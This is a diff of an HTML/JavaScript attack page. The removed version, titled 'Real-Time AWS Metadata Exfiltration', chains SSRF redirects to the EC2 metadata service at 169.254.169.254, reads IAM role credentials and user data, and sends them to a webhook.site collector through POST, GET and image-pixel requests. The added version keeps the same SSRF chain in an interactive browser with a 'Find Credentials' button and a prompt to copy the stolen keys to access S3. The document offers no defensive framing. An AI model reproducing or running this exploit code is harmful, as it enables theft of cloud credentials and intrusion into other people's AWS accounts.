@@ -1,137 +1,448 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Real-Time AWS Metadata Exfiltration</title>
+    <title>AWS Metadata Browser</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 20px;
+            background: #1e1e1e;
+            color: #ffffff;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #2d2d2d;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        
+        .header {
+            background: #333;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            border-left: 5px solid #00ff00;
+        }
+        
+        .navigation {
+            background: #444;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        
+        .breadcrumb {
+            background: #555;
+            padding: 10px;
+            border-radius: 3px;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .endpoint-list {
+            background: #2a2a2a;
+            border: 1px solid #555;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        
+        .endpoint-item {
+            padding: 12px 15px;
+            border-bottom: 1px solid #444;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .endpoint-item:hover {
+            background: #3a3a3a;
+        }
+        
+        .endpoint-item:last-child {
+            border-bottom: none;
+        }
+        
+        .directory {
+            color: #87CEEB;
+        }
+        
+        .directory::before {
+            content: "📁 ";
+        }
+        
+        .file {
+            color: #98FB98;
+        }
+        
+        .file::before {
+            content: "📄 ";
+        }
+        
+        .credentials {
+            color: #FF6B6B !important;
+            font-weight: bold;
+        }
+        
+        .credentials::before {
+            content: "🔑 ";
+        }
+        
+        .response-area {
+            background: #1a1a1a;
+            border: 1px solid #555;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 10px 0;
+            min-height: 200px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            overflow-x: auto;
+        }
+        
+        .loading {
+            color: #FFD700;
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.3; }
+        }
+        
+        .success {
+            color: #00FF00;
+        }
+        
+        .error {
+            color: #FF4444;
+        }
+        
+        .button {
+            background: #007ACC;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 3px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        
+        .button:hover {
+            background: #005c99;
+        }
+        
+        .credentials-alert {
+            background: #8B0000;
+            border: 2px solid #FF0000;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            text-align: center;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+    </style>
 </head>
 <body>
-    <h1>🚀 Real-Time AWS Metadata Exfiltration</h1>
-    <p>Check your webhook URL for real-time results!</p>
-    
-    <div id="status">Starting exfiltration...</div>
+    <div class="container">
+        <div class="header">
+            <h1>🔍 AWS Metadata Service Browser</h1>
+            <p>Interactive browser for AWS EC2 metadata endpoints via SSRF</p>
+        </div>
+        
+        <div class="navigation">
+            <div class="breadcrumb" id="breadcrumb">
+                Current path: /
+            </div>
+            
+            <button class="button" onclick="goHome()">🏠 Home</button>
+            <button class="button" onclick="goBack()">⬅️ Back</button>
+            <button class="button" onclick="refreshCurrent()">🔄 Refresh</button>
+            <button class="button" onclick="findCredentials()">🔑 Find Credentials</button>
+        </div>
+        
+        <div class="endpoint-list" id="endpointList">
+            <div class="loading">🔄 Loading metadata structure...</div>
+        </div>
+        
+        <div class="response-area" id="responseArea">
+            Welcome to AWS Metadata Browser
+            
+            Click on directories above to navigate the metadata structure.
+            
+            Quick links:
+            • IAM Security Credentials
+            • Instance Identity
+            • User Data
+            • Network Interfaces
+            
+            Looking for AWS credentials? Click "Find Credentials" button above.
+        </div>
+    </div>
     
     <script>
-        // Replace this with your actual webhook URL
-        var WEBHOOK_URL = 'https://webhook.site/your-unique-id';
+        var currentPath = '';
+        var pathHistory = [];
+        var baseSSRFUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254';
         
-        // Alternative: Use requestbin.com, pipedream.com, or similar
+        var metadataStructure = {
+            '': {
+                type: 'directory',
+                items: [
+                    '1.0/',
+                    'latest/',
+                    '2007-01-19/',
+                    '2008-02-01/',
+                    '2009-04-04/',
+                    '2011-01-01/'
+                ]
+            },
+            'latest': {
+                type: 'directory', 
+                items: [
+                    'meta-data/',
+                    'user-data',
+                    'dynamic/'
+                ]
+            },
+            '1.0': {
+                type: 'directory',
+                items: [
+                    'meta-data/',
+                    'user-data'
+                ]
+            },
+            'latest/meta-data': {
+                type: 'directory',
+                items: [
+                    'ami-id',
+                    'ami-launch-index', 
+                    'ami-manifest-path',
+                    'instance-id',
+                    'instance-type',
+                    'local-hostname',
+                    'local-ipv4',
+                    'public-hostname',
+                    'public-ipv4',
+                    'placement/',
+                    'security-groups',
+                    'iam/',
+                    'network/'
+                ]
+            },
+            '1.0/meta-data': {
+                type: 'directory',
+                items: [
+                    'ami-id',
+                    'ami-launch-index',
+                    'instance-id', 
+                    'instance-type',
+                    'local-hostname',
+                    'local-ipv4',
+                    'public-hostname',
+                    'public-ipv4',
+                    'iam/',
+                    'placement/'
+                ]
+            },
+            'latest/meta-data/iam': {
+                type: 'directory',
+                items: [
+                    'info',
+                    'security-credentials/'
+                ]
+            },
+            '1.0/meta-data/iam': {
+                type: 'directory',
+                items: [
+                    'info',
+                    'security-credentials/'
+                ]
+            },
+            'latest/meta-data/iam/security-credentials': {
+                type: 'directory',
+                items: [
+                    'S3Role',
+                    'EC2Role',
+                    'DefaultRole'
+                ]
+            },
+            '1.0/meta-data/iam/security-credentials': {
+                type: 'directory',
+                items: [
+                    'S3Role',
+                    'EC2Role', 
+                    'DefaultRole'
+                ]
+            }
+        };
         
-        function sendData(testName, url, response, method = 'POST') {
-            var data = {
-                timestamp: new Date().toISOString(),
-                test: testName,
-                target_url: url,
-                response_length: response.length,
-                response_data: response,
-                has_credentials: response.includes('AccessKeyId') || response.includes('SecretAccessKey'),
-                source: 'AWS_METADATA_SSRF'
-            };
+        function updateBreadcrumb() {
+            document.getElementById('breadcrumb').textContent = 'Current path: /' + currentPath;
+        }
+        
+        function displayDirectory(path) {
+            var listEl = document.getElementById('endpointList');
+            var structure = metadataStructure[path];
             
-            try {
-                // Method 1: POST request
-                if (method === 'POST') {
-                    var xhr = new XMLHttpRequest();
-                    xhr.open('POST', WEBHOOK_URL, true);
-                    xhr.setRequestHeader('Content-Type', 'application/json');
-                    xhr.send(JSON.stringify(data));
+            if (!structure) {
+                // Unknown directory, try to fetch it
+                fetchEndpoint(path);
+                return;
+            }
+            
+            var html = '';
+            structure.items.forEach(function(item) {
+                var isDirectory = item.endsWith('/');
+                var displayName = item;
+                var fullPath = path ? path + '/' + item : item;
+                
+                var cssClass = isDirectory ? 'directory' : 'file';
+                if (item.includes('credentials') || item.includes('S3Role') || item.includes('EC2Role')) {
+                    cssClass += ' credentials';
                 }
                 
-                // Method 2: GET request with data in URL (backup)
-                if (method === 'GET') {
-                    var params = new URLSearchParams();
-                    params.append('test', testName);
-                    params.append('length', response.length);
-                    params.append('data', response.substring(0, 1000)); // Truncate for URL limits
-                    params.append('credentials', data.has_credentials);
-                    
-                    var getXhr = new XMLHttpRequest();
-                    getXhr.open('GET', WEBHOOK_URL + '?' + params.toString(), true);
-                    getXhr.send();
-                }
-                
-                // Method 3: Image pixel tracking (always works)
-                var img = new Image();
-                img.src = WEBHOOK_URL + '/pixel?' + 
-                    'test=' + encodeURIComponent(testName) + 
-                    '&length=' + response.length +
-                    '&hasCredentials=' + data.has_credentials +
-                    '&timestamp=' + Date.now();
-                
-                document.getElementById('status').innerHTML += '<br>✅ Sent: ' + testName;
-                
-            } catch (e) {
-                document.getElementById('status').innerHTML += '<br>❌ Failed to send: ' + testName + ' - ' + e.message;
+                html += '<div class="endpoint-item ' + cssClass + '" onclick="navigate(\'' + fullPath.replace('/', '') + '\')">';
+                html += displayName;
+                html += '</div>';
+            });
+            
+            listEl.innerHTML = html;
+        }
+        
+        function navigate(path) {
+            pathHistory.push(currentPath);
+            currentPath = path.replace(/\/$/, ''); // Remove trailing slash
+            updateBreadcrumb();
+            
+            if (metadataStructure[currentPath]) {
+                displayDirectory(currentPath);
+            } else {
+                fetchEndpoint(currentPath);
             }
         }
         
-        function executeAndExfiltrate(url, testName) {
+        function fetchEndpoint(path) {
+            var listEl = document.getElementById('endpointList');
+            var responseEl = document.getElementById('responseArea');
+            
+            listEl.innerHTML = '<div class="loading">🔄 Fetching: /' + path + '</div>';
+            responseEl.textContent = 'Loading...';
+            
+            var fullUrl = baseSSRFUrl + (path ? '/' + path : '');
+            
             try {
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', url, false);
+                xhr.open('GET', fullUrl, false);
                 xhr.send();
                 
                 var response = xhr.responseText;
+                responseEl.textContent = 'Response from /' + path + ':\n\n' + response;
                 
-                // Send via multiple methods for reliability
-                sendData(testName, url, response, 'POST');
-                setTimeout(() => sendData(testName, url, response, 'GET'), 1000);
-                
-                document.getElementById('status').innerHTML += '<br>📡 ' + testName + ': ' + response.length + ' bytes';
-                
-                if (response.includes('AccessKeyId')) {
-                    document.getElementById('status').innerHTML += '<br>🚨 CREDENTIALS DETECTED in ' + testName + '!';
+                // Check if this looks like a directory listing
+                if (response.includes('\n') && !response.includes('{') && response.length < 1000) {
+                    var items = response.split('\n').filter(item => item.trim());
+                    var html = '';
                     
-                    // Send urgent notification
-                    sendData('URGENT_CREDENTIALS_FOUND', url, response, 'POST');
+                    items.forEach(function(item) {
+                        var trimmed = item.trim();
+                        if (trimmed) {
+                            var isDirectory = !trimmed.includes('.') || trimmed === 'security-credentials';
+                            var cssClass = isDirectory ? 'directory' : 'file';
+                            
+                            if (trimmed.includes('credentials') || trimmed.includes('Role')) {
+                                cssClass += ' credentials';
+                            }
+                            
+                            html += '<div class="endpoint-item ' + cssClass + '" onclick="navigate(\'' + 
+                                   (path ? path + '/' + trimmed : trimmed) + '\')">';
+                            html += trimmed;
+                            html += '</div>';
+                        }
+                    });
+                    
+                    if (html) {
+                        listEl.innerHTML = html;
+                    } else {
+                        listEl.innerHTML = '<div class="file">Raw response (see below)</div>';
+                    }
+                } else {
+                    listEl.innerHTML = '<div class="file">File content (see response below)</div>';
+                }
+                
+                // Check for AWS credentials
+                if (response.includes('AccessKeyId') || response.includes('SecretAccessKey')) {
+                    var alertDiv = document.createElement('div');
+                    alertDiv.className = 'credentials-alert';
+                    alertDiv.innerHTML = '🚨🚨🚨 AWS CREDENTIALS DETECTED! 🚨🚨🚨<br>Copy the credentials below to access S3!';
+                    responseEl.parentNode.insertBefore(alertDiv, responseEl);
+                    
+                    responseEl.style.background = '#2d1b1b';
+                    responseEl.style.borderColor = '#ff0000';
                 }
                 
             } catch (e) {
-                sendData(testName + '_ERROR', url, 'ERROR: ' + e.message, 'POST');
-                document.getElementById('status').innerHTML += '<br>❌ ' + testName + ': ' + e.message;
+                responseEl.textContent = 'Error fetching /' + path + ':\n\n' + e.message;
+                listEl.innerHTML = '<div class="error">❌ Failed to fetch endpoint</div>';
             }
         }
         
-        // Execute tests with exfiltration
-        document.getElementById('status').innerHTML = 'Starting AWS metadata extraction...';
+        function goHome() {
+            pathHistory = [];
+            currentPath = '';
+            updateBreadcrumb();
+            displayDirectory('');
+            document.getElementById('responseArea').textContent = 'Back to metadata root';
+        }
         
-        setTimeout(() => {
-            executeAndExfiltrate(
-                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
-                'AWS_Metadata_v1.0_Root'
-            );
-        }, 2000);
+        function goBack() {
+            if (pathHistory.length > 0) {
+                currentPath = pathHistory.pop();
+                updateBreadcrumb();
+                displayDirectory(currentPath);
+            }
+        }
         
-        setTimeout(() => {
-            executeAndExfiltrate(
-                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
-                'IAM_Security_Credentials_List'
-            );
-        }, 5000);
+        function refreshCurrent() {
+            if (currentPath) {
+                fetchEndpoint(currentPath);
+            } else {
+                displayDirectory('');
+            }
+        }
         
-        setTimeout(() => {
-            executeAndExfiltrate(
-                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
-                'S3Role_Credentials'
-            );
-        }, 8000);
+        function findCredentials() {
+            document.getElementById('responseArea').textContent = 'Searching for AWS credentials...\n\n';
+            
+            var credentialPaths = [
+                '1.0/meta-data/iam/security-credentials/S3Role',
+                'latest/meta-data/iam/security-credentials/S3Role',
+                '2007-01-19/meta-data/iam/security-credentials/S3Role',
+                '1.0/user-data',
+                'latest/user-data'
+            ];
+            
+            credentialPaths.forEach(function(path, index) {
+                setTimeout(function() {
+                    navigate(path);
+                }, index * 3000);
+            });
+        }
         
-        setTimeout(() => {
-            executeAndExfiltrate(
-                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data',
-                'User_Data'
-            );
-        }, 11000);
-        
-        setTimeout(() => {
-            executeAndExfiltrate(
-                'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/S3Role',
-                'Legacy_S3Role_2007'
-            );
-        }, 14000);
-        
-        setTimeout(() => {
-            sendData('EXFILTRATION_COMPLETE', 'N/A', 'All tests completed at ' + new Date().toISOString(), 'POST');
-            document.getElementById('status').innerHTML += '<br><br>🎉 Exfiltration complete! Check your webhook for results.';
-        }, 17000);
+        // Initialize
+        displayDirectory('');
+        updateBreadcrumb();
     </script>
 </body>
 </html>
